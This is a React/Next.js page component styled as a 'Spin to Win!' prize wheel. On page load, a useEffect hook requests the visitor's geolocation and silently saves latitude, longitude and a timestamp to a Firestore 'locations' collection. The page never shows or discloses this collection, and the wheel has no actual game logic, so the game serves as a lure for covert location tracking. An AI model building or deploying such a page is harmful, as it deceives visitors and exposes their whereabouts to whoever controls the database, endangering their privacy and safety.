'use client'

import { useEffect, useState } from 'react'
import { db } from '@/lib/firebase'
import { collection, addDoc, Timestamp } from 'firebase/firestore'

export default function Home() {
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [saved, setSaved] = useState(false)

  useEffect(() => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser')
      return
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude
        const lng = position.coords.longitude

        setLocation({ lat, lng })

        try {
          await addDoc(collection(db, 'locations'), {
            lat,
            lng,
            timestamp: Timestamp.now(),
          })
          setSaved(true)
        } catch (err: any) {
          setError('Failed to save to Firestore: ' + err.message)
        }
      },
      (err) => {
        setError(`Error getting location: ${err.message}`)
      }
    )
  }, [])

  return (
    <main className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-[#fff1eb] to-[#fddcdc] text-center px-4">
  <h1 className="text-5xl font-extrabold text-[#ff4d4f] mb-10 drop-shadow-lg tracking-wide">
    🎯 Spin to Win!
  </h1>

  <div className="w-80 h-80 flex items-center justify-center bg-white rounded-full shadow-2xl border-[10px] border-[#ffb3af]">
    <img
      src="/spin.png"
      alt="Spin Wheel"
      className="w-60 h-60 object-contain transition-transform duration-700 ease-in-out hover:rotate-[360deg]"
    />
  </div>
</main>



  )
}
